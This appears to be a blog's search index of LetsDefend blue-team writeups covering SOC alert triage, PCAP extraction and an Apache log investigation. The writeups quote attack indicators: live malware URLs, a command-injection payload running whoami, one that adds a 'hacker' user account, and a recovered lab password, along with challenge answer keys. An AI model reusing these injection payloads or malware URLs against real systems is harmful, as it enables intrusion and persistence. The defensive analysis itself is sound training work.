
[{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation involving a blocked attempt to download a Microsoft Word document with attached VBS macros. Alert Details # Key: Value EventID: 76 Event Time: Mar, 14, 2021, 07:15 PM Rule: SOC137 - Malicious File/Script Download Attempt Level: Security Analyst Source Address: 172.16.17.37 Source Hostname: NicolasPRD File Name: INVOICE PACKAGE LINK TO DOWNLOAD.docm File Hash: f2d0c66b801244c059f636d08a474079 File Size: 16.66 Kb Device Action: Blocked File (Passwordinfected): Download Initial Triage # Actions # Copied alert details to notes Created case Began analysis Thoughts # \u0026ldquo;Luckily the VBS macro\u0026rsquo;d doc file got blocked.\u0026rdquo;\nPlaybook # Step 1. Check if the malware is quarantined/cleaned # Log Management # No relevant logs. (You must keep in mind the timeline. There is another case for the same endpoint in the same month, but they are unrelated to this exercise.)\nEndpoint Security # Endpoint is messed up due to a different case, but there is no indication the case we\u0026rsquo;re working on has execution.\nThoughts # \u0026ldquo;Quarantined. The malware was successfully blocked.\u0026rdquo;\nStep 2. Analyze Malware # VirusTotal # Data Result MD5 Hash 39/66 Thoughts # \u0026ldquo;Malicious. If there was execution of this malware, we\u0026rsquo;d see a DNS resolution of filetransfer.io\u0026rdquo;\nStep 3. Check if Someone Requested the C2 # Log Management # No relevant logs. Not connecting to the IOC domain we indicated.\nThoughts # \u0026ldquo;Not Accessed. Endpoint didn\u0026rsquo;t run the malware.\u0026rdquo;\nStep 4. Artifacts # Value Comment Type f2d0c66b801244c059f636d08a474079 trojan.vpnz MD5 Hash Step 5. Analyst Notes # \u0026ldquo;Verdict: True Positive. Closing case. Summary: Endpoint attempted to download malicious DOCM file (Microsoft Word file with VBS macros) and was blocked. (Machine has other issues, but outside scope of this alert.) Validated via: Log Management, Endpoint Security, VirusTotal. Actions taken: None.\u0026rdquo;\nDetermination # Verdict # True Positive Close Case Reasoning # It was indeed malware. (trojan.vpnz) It was blocked. Final Thoughts # \u0026ldquo;I\u0026rsquo;m happy the DOCM was blocked! Though this exercise did have issues with a lot of overlap with another alert so you had to ignore some problems. Not exactly what you\u0026rsquo;d do in a real SOC.\u0026rdquo;\n","date":"February 26 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/137_76/","section":"Writeups","summary":"Investigating a malicious DOCM download attempt, validating the file hash via VirusTotal, confirming no execution or C2 communication occurred, and verifying the threat was successfully blocked before impact.","title":"(Writeup) LetsDefend EventID: 76 - [SOC137 - Malicious File/Script Download Attempt]","type":"writeups"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/categories/letsdefend/","section":"Categories","summary":"","title":"LetsDefend","type":"categories"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/writeups/letsdefend/","section":"Writeups","summary":"LetsDefend writeups focused on SOC alert handling, malware analysis, phishing investigations, and structured blue-team workflows.","title":"LetsDefend","type":"writeups"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/tags/macros/","section":"Tags","summary":"","title":"Macros","type":"tags"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/tags/siem/","section":"Tags","summary":"","title":"SIEM","type":"tags"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/tags/soc/","section":"Tags","summary":"","title":"SOC","type":"tags"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/","section":"Writeups","summary":"Structured SOC alert investigation writeups documenting true and false positive determinations, log correlation, threat validation, and incident response actions.","title":"SOC Alerts","type":"writeups"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/tags/true_positive/","section":"Tags","summary":"","title":"True_Positive","type":"tags"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/tags/type_malware/","section":"Tags","summary":"","title":"Type_Malware","type":"tags"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/tags/vba/","section":"Tags","summary":"","title":"VBA","type":"tags"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/tags/virustotal/","section":"Tags","summary":"","title":"VirusTotal","type":"tags"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/tags/writeup/","section":"Tags","summary":"","title":"Writeup","type":"tags"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"Technical cybersecurity writeups documenting hands-on investigations, SOC alert triage, malware analysis, and offensive security labs across HackTheBox and LetsDefend.","title":"Writeups","type":"writeups"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation involving {{ alert type }}. Alert Details # Key: Value EventID: 75 Event Time: Mar, 07, 2021, 05:47 PM Rule: SOC105 - Requested T.I. URL address Level: Security Analyst Source Address: 10.15.15.12 Source Hostname: MarksPhone Destination Address: 67.199.248.10 Destination Hostname: bit.ly Username: Mark Request URL: https://bit.ly/TAPSCAN User Agent: Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36 Device Action: Allowed Initial Triage # Actions # Copied alert details to notes Created case Began analysis Thoughts # \u0026ldquo;Is that specific bit.ly address a threat indicator, or is it bit.ly in general?\u0026rdquo;\nPlaybook # Step 1. Analyze Threat Intel Data # VirusTotal # Data Result Note IP 2/93 It\u0026rsquo;s bit.ly the URL shortener. It\u0026rsquo;s utilized by benign and malicious traffic alike. URL 1/94 You can find the \u0026lsquo;Final URL\u0026rsquo; in the \u0026lsquo;Details\u0026rsquo; tab. Final URL 1/94 In the URL and in \u0026lsquo;Details\u0026rsquo; you can find the app name and the developer\u0026rsquo;s website URL. Developer URL 0/94 Gonna google about this application. Google # \u0026ldquo;Searching for the app name pdf.tap.scanner gives us the very popular android application: \u0026lsquo;PDF Scanner app - TapScanner\u0026rsquo;\u0026hellip; Non-malicious\u0026rdquo;\nStep 2. Add Artifacts # (The long url was snipped for the writeup page formatting.)\nValue Comment Type 67.199.248.10 A bit.ly ip IP Address https://bit.ly/TAPSCAN Alert Trigger E-mail Domain -long_url_snipped- Redirect Final URL E-mail Domain Step 3. Analyst Notes # \u0026ldquo;Verdict: False Positive. Closing Case. Summary: Endpoint opened bit.ly link that linked to a popular PDF scanner on android. No indicators of application being malicious. Validated via: VirusTotal. Actions taken: None.\u0026rdquo;\nDetermination # Verdict # False Positive Close Case Reasoning # Legitimate bit.ly link to a popular pdf scanning app on the google play store Final Thoughts # \u0026ldquo;Would be a good idea to review if the alert is happening on anything above 0 from TI, because I imagine some will regard any and all bit.ly links as malicious. If that\u0026rsquo;s the standard we want to keep, that\u0026rsquo;s fine. Just something to consider.\u0026rdquo;\n","date":"February 26 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/105_75/","section":"Writeups","summary":"Investigating a threat intelligence alert triggered by a bit.ly URL, expanding the shortened link to its final destination, validating reputation across VirusTotal, and confirming the traffic was legitimate mobile application activity before closing as a false positive.","title":"(Writeup) LetsDefend EventID: 75 - [SOC105 - Requested T.I. URL address]","type":"writeups"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/tags/false_positive/","section":"Tags","summary":"","title":"False_Positive","type":"tags"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/tags/type_threat_intel/","section":"Tags","summary":"","title":"Type_Threat_Intel","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation involving an internal test of the firewall via attempting to connect out to a malicious URL. Alert Details # Key: Value EventID: 28 Event Time: Oct, 29, 2020, 07:34 PM Rule: SOC105 - Requested T.I. URL address Level: Security Analyst Source Address: 172.16.17.47 Source Hostname: BillPRD Destination Address: 115.99.150.132 Username: Bill Request URL: http://115.99.150.132:56841/Mozi.m User Agent: Firewall Test - Dont Block Device Action: Blocked Initial Triage # Actions # Copied alert details to notes Created case Check for \u0026ldquo;Firewall Test\u0026rdquo; email. Thoughts # \u0026ldquo;That user-agent\u0026hellip; Is it actually or firewall test, or just pretending to be one?\u0026rdquo;\nEmail # \u0026ldquo;Searching for \u0026lsquo;Firewall Test\u0026rsquo; or the destination address comes up with the following email:\nFrom: jack.miller@letsdefend.io To: soc@letsdefend.io Subject: Firewall Test Date: Oct, 28, 2020, 09:28 AM Action: Allowed Hi team, We'll do a test on the Firewall tomorrow. You may see some malicious traffic to the 115.99.150.132 IP address. Ignore it. Regards Thoughts # \u0026ldquo;In the real world, I\u0026rsquo;d be doing a phone call to verify. In this exercise, I believe we just take it at face value.\u0026rdquo;\nPlaybook # Step 1. Analyze Threat Intel Data # VirusTotal # Key: Value URL 8/94 Body Hash 0/61 (-60 Community Score) Thoughts # \u0026ldquo;Odd\u0026hellip; While the URL has some malicious reports, the body is an image? And that image isn\u0026rsquo;t coming back with anything. I\u0026rsquo;m gonna check the internal threat intel feed.\u0026rdquo;\nInternal Threat Intel Feed # Key: Value Date Oct, 29, 2020, 07:43 PM Data Type URL Data http://115.99.150.132:56841/Mozi.m Tag malware Data Source Abuse ch Thoughts # \u0026ldquo;If I were to guess, I imagine enough time has passed that the original data we were meant to find isn\u0026rsquo;t there anymore. We\u0026rsquo;ll go with Malicious for the sake of the exercise.\u0026rdquo;\nStep 2. Interaction with Threat Intelligence Data # Log Management # Key: Value type: Proxy source_address: 172.16.17.47 source_port: 46938 destination_address: 115.99.150.132 destination_port: 56841 time: Oct, 29, 2020, 07:34 PM Request URL: http://115.99.150.132:56841/Mozi.m Request Method: GET Device Action: Blocked Process: chrome.exe Parent Process: explorer.exe Parent Process MD5: 8b88ebbb05a0e56b7dcc708498c02b3e Thoughts # \u0026ldquo;I thought for a moment that they might\u0026rsquo;ve not actually used the endpoint, and instead spoofed a TCP SYN, but this log looks too enriched for that.\u0026rdquo;\nEndpoint Security # Thoughts # \u0026ldquo;Looks like it was successfully blocked; no \u0026rsquo;network action\u0026rsquo; connections there. Also keeping in mind that it\u0026rsquo;s a test\u0026hellip; Not Accessed\u0026rdquo;\nStep 3. Artifacts # Value Comment Type http://115.99.150.132:56841/Mozi.m Malware (TI: Abuse ch) URL Step 4. Analyst Notes # \u0026ldquo;Verdict: False Positive. Closing Case. Summary: Firewall Test via (jack.miller@letsdefend.io) email. Was real malicious URL. Validated via: Log Management, Endpoint Security, Threat Intel, Email Security. Actions taken: None.\u0026rdquo;\nDetermination # Verdict # False Positive Close Case Reasoning # This was an internal firewall test, no action needed. Final Thoughts # \u0026ldquo;The wording was a bit odd when you have to view it from the lens of handling an internal test. Also, I believe some of the data we were supposed to be viewing was destroyed\u0026hellip; Worked out in the end by checking more TI feeds.\u0026rdquo; \u0026ldquo;Also, the playbook is missing the \u0026lsquo;check email to see if it\u0026rsquo;s an internal test\u0026rsquo; step.\u0026rdquo;\n","date":"February 26 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/105_28/","section":"Writeups","summary":"Investigating a threat intelligence alert tied to a known malicious URL, validating indicators across external and internal TI sources, correlating proxy and endpoint logs, and determining the activity was part of an authorized internal firewall test.","title":"(Writeup) LetsDefend EventID: 28 - [SOC105 - Requested T.I. URL address]","type":"writeups"},{"content":"","date":"February 26 2026","externalUrl":null,"permalink":"/tags/internal_test/","section":"Tags","summary":"","title":"Internal_Test","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation involving {{ alert type }}. Alert Details # Key: Value EventID: 20 Event Time: Oct, 19, 2020, 09:54 PM Rule: SOC105 - Requested T.I. URL address Level: Security Analyst Source Address: 172.16.20.4 Source Hostname: gitServer Destination Address: 151.101.112.133 Destination Hostname: raw.github.com Username: gitUser Request URL: https://raw.githubusercontent.com/django/django/master/setup.py User Agent: Wget/1.19.4 (linux-gnu) Device Action: Allowed Initial Triage # Actions # Copied alert details to notes Created case Began analysis Thoughts # \u0026ldquo;That looks like the normal GitHub \u0026lsquo;raw\u0026rsquo; url. If I were a betting man, I\u0026rsquo;d bet false positive.\u0026rdquo;\nPlaybook # Step 1. Analyze Threat Intel Data # VirusTotal # Item Result Comment IP Green Google results under \u0026ldquo;Details\u0026rdquo; mentions it being a raw.githubusercontent.com IP. URL 1/94 One false positive. Domain Green Real GitHub domain. GitHub # \u0026ldquo;I went to https://github.com/django/django to take a look. It\u0026rsquo;s the real django page. setup.py isn\u0026rsquo;t there anymore so they must\u0026rsquo;ve moved it. Regardless, it\u0026rsquo;s a false positive.\u0026rdquo;\nStep 2. Artifacts # Value Comment Type https://raw.githubusercontent.com/django/django/master/setup.py github django setup python script E-mail Domain 151.101.112.133 a github ip IP Address Step 3. Analyst Notes # \u0026ldquo;Verdict: False Positive. Closing Case. Summary: Endpoint connected to a github url via wget to download a setup script for django. Validated via: VirusTotal, GitHub. Actions Taken: None.\u0026rdquo;\nDetermination # Verdict # False Positive Closing Case Reasoning # The URL they connected to was a well known good repository on GitHub. The script they were attempting to get was to set up Django; not malware. That traffic is not unexpected for a gitUser on a gitServer. Final Thoughts # \u0026ldquo;I can understand why it would alert on GitHub urls. However, the alerts should probably have a whitelist of sorts for repositories the organization is expecting and would reasonably allow.\u0026rdquo;\n","date":"February 25 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/105_20/","section":"Writeups","summary":"Investigating a threat intelligence alert after a server connected to a flagged URL, validating the IP, domain, and repository source, confirming legitimate GitHub activity, and closing the case as a false positive.","title":"(Writeup) LetsDefend EventID: 20 - [SOC105 - Requested T.I. URL address]","type":"writeups"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation involving a threat intelligence alert indicating an endpoint is connecting out to a known malicious domain. Alert Details # Key: Value EventID: 16 Event Time: Sep, 20, 2020, 10:54 PM Rule: SOC105 - Requested T.I. URL address Level: Security Analyst Source Address: 172.16.17.47 Source Hostname: BillPRD Destination Address: 5.188.0.251 Destination Hostname: pssd-ltdgroup.com Username: Mike01 Request URL: https://pssd-ltdgroup.com User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063 Device Action: Allowed Initial Triage # Actions # Copied alert details to notes Created case Began analysis Thoughts # \u0026ldquo;Always confuses me when it\u0026rsquo;s allowed for endpoints to connect to known bad domains. Regardless, we\u0026rsquo;ll play by the playbook.\u0026rdquo;\nPlaybook # Step 1. Analyze Threat Intel Data # IP # Key: Value VirusTotal: 0/93 (Relations Shows Otherwise) Thoughts # \u0026ldquo;That initial score is misleading. Looking in the \u0026lsquo;Relations\u0026rsquo; tab shows that it is associated with malware.\u0026rdquo;\nDomain Name # Key: Value VirusTotal: 15/94 (Malicious) Thoughts # \u0026ldquo;That\u0026rsquo;s more of what I was expecting.\u0026rdquo;\nStep 2. Interaction with TI data # Log Management: # Key: Value type: Firewall source_address: 172.16.17.47 source_port: 54211 destination_address: 5.188.0.251 destination_port: 443 time: Sep, 20, 2020, 10:54 PM Main Process: Krankheitsmeldung_092020_07.xlsm Request URL: https://pssd-ltdgroup.com Thoughts # \u0026ldquo;Because of course it\u0026rsquo;s a VBS macro\u0026rsquo;d excel sheet connecting out.\u0026rdquo;\nEndpoint Security # Processes # Key: Value MD5: 14970ce0a3d03c46a4180db69866d0d1 Path: c:/users/Bill/desktop/Krankheitsmeldung_092020_07.xlsm Size: 558.83 KB Username: Bill01 Start Time: 20.09.2020 22:51 Key: Value VirusTotal: 47/67 (trojan.gracewire/smth) Thoughts # \u0026ldquo;Surprised the anti-malware on the endpoint didn\u0026rsquo;t pick this up. For that matter, why can endpoints run VBS macro\u0026rsquo;d files?\u0026rdquo;\nStep 3. Containment # Endpoint Security Action # Containment of BillPRD endpoint initiated Step 4. Artifacts # Value Comment Type 14970ce0a3d03c46a4180db69866d0d1 trojan.gracewire/smth MD5 Hash pssd-ltdgroup.com IOC for Attached Malware E-mail Domain 5.188.0.251 IOC Domain Resolved IP IP Address Step 5. Analyst Note # \u0026ldquo;Verdict: True Positive. Escalate. Summary: Endpoint ran a trojan VBS macro\u0026rsquo;d excel file. Contacted out to C2. Containment initiated. Validated via: Logs, Endpoint, VirusTotal. Actions Taken: Containment Initiated.\u0026rdquo;\nDetermination # Verdict # True Positive Escalate Case Reasoning # Network IOC and endpoint process logs verify that malware has been run. The endpoint is compromised. Final Thoughts # \u0026ldquo;Was odd that VirusTotal\u0026rsquo;s score for that IP comes back green, when the relations tab shows clearly that malicious domains and malicious files are related to it.\u0026rdquo; \u0026ldquo;I\u0026rsquo;m sure the organization has a reason, but I really wish macros were blocked on an organizational level with few exceptions.\u0026rdquo;\n","date":"February 25 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/105_16/","section":"Writeups","summary":"Investigating a threat intelligence alert after an endpoint connected to a known malicious domain, correlating firewall logs to a macro-enabled Excel file execution, validating the malware through VirusTotal, and initiating containment following confirmed C2 communication.","title":"(Writeup) LetsDefend EventID: 16 - [SOC105 - Requested T.I. URL address]","type":"writeups"},{"content":"","date":"February 25 2026","externalUrl":null,"permalink":"/tags/malware/","section":"Tags","summary":"","title":"Malware","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents an Easy-level challenge focused on extracting information and files from PCAPs in Wireshark. Challenge Overview # Role Targeted: Security Analyst Skill Level: Easy\nScenario # We reached the data of an agent leaking information. You have to disclose the agent.\nLog file: /root/Desktop/ChallengeFile/smtpchallenge.pcap Note: pcap file found public resources.\nPCAP Analysis # Initial Thoughts # \u0026ldquo;Interesting, based on the questions, we might have to carve files out of SMTP.\u0026rdquo;\nQuestion-Based Analysis # What is the email address of Ann\u0026rsquo;s secret boyfriend? Following the TCP streams, we can flip through the streams. The first TCP stream is an email, but it doesn\u0026rsquo;t look like a conversation with a significant other. The second stream (tcp.stream eq 1) DOES, though, specifically calling the other person \u0026ldquo;sweetheart\u0026rdquo;. Based on that, the recipient is mistersecretx@aol.com found under RCPT TO:. What is Ann\u0026rsquo;s email password? Still in the tcp.stream eq 1, we can find after the client prompts to login the server responds with base64 essentially asking for username then asking for password. The client responds in that order. So the 4th base64 in the list is the one we\u0026rsquo;re looking for. echo \u0026quot;NTU4cjAwbHo=\u0026quot; | base64 -d ; echo gives us the answer: 588r00lz What is the name of the file that Ann sent to his secret lover? Still in tcp.stream eq 1, we can find this after the email body. filename=\u0026quot;secretrendezvous.docx\u0026quot; In what country will Ann meet with her secret lover? This information isn\u0026rsquo;t in the email body, so it\u0026rsquo;s probably in the attached document. Let\u0026rsquo;s extract it. We\u0026rsquo;ll \u0026ldquo;Save As\u0026rdquo; the TCP stream we\u0026rsquo;ve been analyzing into a file. I named mine tcpstream1. A quick look at it in vi by paging down a bit will lets us know that the first 77 lines are all SMTP data, and so is the last 7 lines. We can use a little head and tail trickery to trim it. tail -n +78 tcpstream1 \u0026gt; tcpstream2 Which tells tail to start at line 78, then go until the end of the file. We redirect the output into a new file. head -n -7 tcpstream2 \u0026gt; tcpstream3 Which tells head to start from the top, but omit the last 7 lines. We redirect the output into a new file. Finally we decode the base64! base64 -d tcpstream3 \u0026gt; secretrendezvous.docx I tried to strings the document, but got little of use. So since this is in a lab machine, I just opened it. (not a mentality I\u0026rsquo;d recommend at home) and it turns out the country is located in a picture! It says they\u0026rsquo;re meeting at \u0026ldquo;Playa del Carmen\u0026rdquo; in Mexico What is the MD5 value of the attachment Ann sent? a quick md5sum secretrendezvous.docx gives us: 9e423e11db88f01bbff81172839e1923 Summary # Questions Answers What is the email address of Ann\u0026rsquo;s secret boyfriend? mistersecretx@aol.com What is Ann\u0026rsquo;s email password? 558r00lz What is the name of the file that Ann sent to his secret lover? secretrendezvous.docx In what country will Ann meet with her secret lover? mexico What is the MD5 value of the attachment Ann sent? 9e423e11db88f01bbff81172839e1923 Final Thoughts # \u0026ldquo;Fun to use a little bash-fu to get the attachment!\u0026rdquo;\n","date":"February 23 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/disclose_the_agent/","section":"Writeups","summary":"Analyzing an SMTP PCAP to identify leaked credentials, decode Base64 authentication data, extract and reconstruct an email attachment from network traffic, and verify file integrity through hashing.","title":"(Writeup) LetsDefend Challenge - Disclose The Agent","type":"writeups"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/bash/","section":"Tags","summary":"","title":"Bash","type":"tags"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/challenge/","section":"Tags","summary":"","title":"Challenge","type":"tags"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/","section":"Writeups","summary":"LetsDefend challenge writeups demonstrating malware triage, Sigma rule analysis, document investigation, and blue-team detection skills.","title":"Challenge","type":"writeups"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/security_analyst/","section":"Tags","summary":"","title":"Security_Analyst","type":"tags"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/wireshark/","section":"Tags","summary":"","title":"Wireshark","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents a SOC alert investigation into a malicious Excel file containing macros that ran on an endpoint, resulting in a compromise. Alert Details # Key: Value EventID: 77 Event Time: Mar, 13, 2021, 08:20 PM Rule: SOC138 - Detected Suspicious Xls File Level: Security Analyst Source Address: 172.16.17.56 Source Hostname: Sofia File Name: ORDER SHEET \u0026amp; SPEC.xlsm File Hash: 7ccf88c0bbe3b29bf19d877c4596a8d4 File Size: 2.66Mb Device Action: Allowed Initial Triage # Actions # Copied alert details to notes Created case Began analysis Thoughts # \u0026ldquo;It was a \u0026lsquo;xlsm\u0026rsquo; file (Excel sheet containing VBA macros) and yet it was allowed. Oh boy. Let\u0026rsquo;s start with the network logs of the endpoint in the SIEM to see what it\u0026rsquo;s been up to. I\u0026rsquo;ll also throw that file into VirusTotal and Hybrid Analysis.\u0026rdquo;\nAnalysis # Tools Used # VirusTotal Hybrid Analysis Talos Intelligence AbuseIPDB Firewall Logs # Key: Value type: Firewall source_address: 172.16.17.56 source_port: 52155 destination_address: 177.53.143.89 destination_port: 443 time: Mar, 13, 2021, 08:20 PM Data: ....5...1..K|ÍtV.kE...Ù.c..b§.7rÊb.?\u0026amp;........ÿ.. Key: Value type: Firewall source_address: 172.16.17.56 source_port: 52155 destination_address: 177.53.143.89 destination_port: 443 time: Mar, 13, 2021, 08:20 PM Data: ....}...y..K|Í|.....y.\u0026lt;§¢jJê#.....mrZ¡.Ã..../.5..... Thoughts # \u0026ldquo;Ah, it\u0026rsquo;s encrypted data being sent to a IP that aligns up perfectly with the time of the Malicious XLS alert\u0026hellip; I\u0026rsquo;m gonna initiate containment.\u0026rdquo;\nEndpoint (EDR Agent) # Actions # Initiate containment on host: Sofia Thoughts # \u0026ldquo;The logs are barren, like they\u0026rsquo;ve been wiped.\u0026rdquo;\nFile # Key Value VirusTotal: 46/65 (trojan.acao/docdl) Hybrid Analysis: 100/100 Malicious (CVE-2017-11882) Thoughts # \u0026ldquo;The C2 address is multiwaretecnologia.com.br which resolves to 177.53.143.89 which is indeed the address the endpoint connected to.\u0026rdquo;\nIP # Key Value VirusTotal: 0/93 Talos Intelligence: Neutral AbuseIPDB: Not Found Thoughts # \u0026ldquo;Eh? The C2 address has no reports\u0026hellip; Is this a new campaign, or a targeted campaign?\u0026rdquo;\nEmail # Thoughts # \u0026ldquo;No email stating this is a penetration test.\u0026rdquo;\nDetermination # Verdict # True Positive Escalate Case Reasoning # The file is malware. (VirusTotal \u0026amp; Hybrid-Analysis) The endpoint connected to the C2 address, indicating the malware was indeed executed. Actions # Endpoint containment was initiated. Playbook # Questions # Questions Answers Check if the malware is quarantined/cleaned Not Quarantined Analyze Malware Malicious Check If Someone Requested the C2 Accessed Artifacts # Value Comment Type 7ccf88c0bbe3b29bf19d877c4596a8d4 trojan.acao/docdl MD5 Hash 177.53.143.89 C2 IP IP Address https://multiwaretecnologia.com.br/js/Podaliri4.exe Next stage for dropper. URL Notes # \u0026ldquo;True Positive. Escalating. Summary: Endpoint obtained and ran malware. Containment Initiated. Validated via: EDR Logs, Firewall logs, VirusTotal, Hybrid-Analysis. Actions taken: Endpoint containment initiated.\u0026rdquo;\nFinal Thoughts # \u0026ldquo;Interesting how the C2 address\u0026rsquo;s IP wasn\u0026rsquo;t flagged. Shows that things aren\u0026rsquo;t always detected at first so don\u0026rsquo;t hold too much weight on \u0026rsquo;neutral\u0026rsquo; reputation results.\u0026rdquo;\n","date":"February 23 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/138_77/","section":"Writeups","summary":"Investigating a suspicious Excel macro alert after a malicious XLSM file executed on an endpoint, validating malware through VirusTotal and Hybrid Analysis, correlating outbound encrypted traffic to a confirmed C2 server, and initiating containment following confirmed compromise.","title":"(Writeup) LetsDefend EventID: 77 - [SOC138 - Detected Suspicious Xls File]","type":"writeups"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/hybrid-analysis/","section":"Tags","summary":"","title":"Hybrid-Analysis","type":"tags"},{"content":" Welcome # LetsDefend is a Blue Team Training platform. This writeup documents an Easy-level challenge focused on analyzing Apache logs using bash tools such as awk, grep, sort, and uniq. Challenge Overview # Role Targeted: Security_Analyst Skill Level: Easy\nScenario # We detected some web attacks and need to do deep investigation.\nChallenge File: /root/Desktop/ChallengeFile/access.log\nInitial Thoughts # \u0026ldquo;The file is access.log, which makes me think of Apache. If we\u0026rsquo;re going through Apache logs, it\u0026rsquo;ll take some bash-fu.\u0026quot;\n\u0026ldquo;Ah, the size of the file is only 2MB, which is much smaller than expected; but still bigger than what would be easy to analyze in Notepad.\u0026rdquo;\nQuestions # Which automated scan tool did attacker use for web reconnaissance? If they used a tool, the implication is that it\u0026rsquo;s probably in the user-agent. Let\u0026rsquo;s figure out which column we need to grab for that. After cding to the directory we run head access.log to get a sample from the top of the file. We can see from the output that if we\u0026rsquo;re looking for the user-agent then \u0026quot; would be a good delimiter. After a little with the output of the head command we get the following command to get all the unique user-agents from the log: awk -F\\\u0026quot; '{print $6}' access.log | sort | uniq -c Woah, while we got the answer of Nikto\u0026hellip; That\u0026rsquo;s a lot of output, because it puts the test in the user agent. We can pipe the output into another awk to filter it down for easier viewing: awk -F\\\u0026quot; '{print $6}' access.log | awk '{print $1 $2}' | sort | uniq -c After web reconnaissance activity, which technique did attacker use for directory listing discovery? Directory listing\u0026hellip; Sounds like Forced Browsing\u0026hellip; unless the Apache server has directory indexing enabled. (Mentioning forced browsing, I quite like feroxbuster myself.) But we need to look at he path in the logs: awk -F\\\u0026quot; '{print $2}' access.log | sort | uniq -c Yep, so many attempted files and directories that it can\u0026rsquo;t even fit in the terminal history. That\u0026rsquo;s definitely forced browsing\u0026hellip; But that isn\u0026rsquo;t the answer? It looks like they are using slightly different terminology: directory brute force What is the third attack type after directory listing discovery? If we list the paths without sorting, we can get an idea of where the forced browsing ends (we\u0026rsquo;ll still use uniq -c to minimize repeats at least): awk -F\\\u0026quot; '{print $2}' access.log | uniq -c We can see 134 POST requests in a row at /bWAPP/login.php, indicating they were brute-forcing the login page. Is the third attack successful? Knowing the path and method they are using, we can grep to grab those logs: grep 'POST /bWAPP/login.php HTTP/1.1' access.log and we can instantly see that many of the requests were responding with HTTP code 200, with a size of 4086 every time. Until the end, when the server responds with an HTTP 302 code indicating a redirect. That usually happens on a successful login. So, yes. What is the name of fourth attack? We saw something earlier at the bottom of the log when we used the command: awk -F\\\u0026quot; '{print $2}' access.log | uniq -c We notice at the very bottom: GET /bWAPP/phpi.php?message=%22%22;%20system(%27whoami%27) HTTP/1.1 so we know that code injection is the answer. (Personally, I\u0026rsquo;d go by OWASP and call it \u0026ldquo;Command Injection\u0026rdquo; but that isn\u0026rsquo;t what the answer is looking for.) What is the first payload for 4th attack? Seeing as the attack was at the very bottom, we can check if we can see them with tail and we can indeed: tail access.log We can see after sending a test, they send: GET /bWAPP/phpi.php?message=%22%22;%20system(%27whoami%27) HTTP/1.1 which is php code injected to run the shell command: whoami Is there any persistency clue for the victim machine in the log file ? If yes, what is the related payload? In the very last log we see: GET /bWAPP/phpi.php?message=%22%22;%20system(%27net%20user%20hacker%20Asd123!!%20/add%27) HTTP/1.1 which has php code to run the shell command: net user hacker Asd123!! /add: the attacker added a user to the machine. Summary # Questions Answers Which automated scan tool did attacker use for web reconnaissance? nikto After web reconnaissance activity, which technique did attacker use for directory listing discovery? directory brute force What is the third attack type after directory listing discovery? brute force Is the third attack successful? yes What is the name of fourth attack? code injection What is the first payload for 4th attack? whoami Is there any persistency clue for the victim machine in the log file ? If yes, what is the related payload? %27net%20user%20hacker%20asd123!!%20/add%27 Key Takeaways # \u0026ldquo;It\u0026rsquo;s not always possible to handle elegant logs ingested and enriched by a SIEM. Sometimes we need to dig into the logs from the endpoint straight. It\u0026rsquo;s good to practice those skills. Bash-fu is useful.\u0026rdquo;\n","date":"February 23 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/investigate_web_attack/","section":"Writeups","summary":"Analyzing raw Apache access logs with Bash tools to identify reconnaissance with Nikto, forced browsing, successful login brute force activity, and command injection leading to account creation on the target system.","title":"(Writeup) LetsDefend Challenge - Investigate Web Attack","type":"writeups"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/apache_http/","section":"Tags","summary":"","title":"Apache_HTTP","type":"tags"},{"content":"","date":"February 23 2026","externalUrl":null,"permalink":"/tags/brute_force/","section":"Tags","summary":"","title":"Brute_Force","type":"tags"},{"content":"","date":"February 23 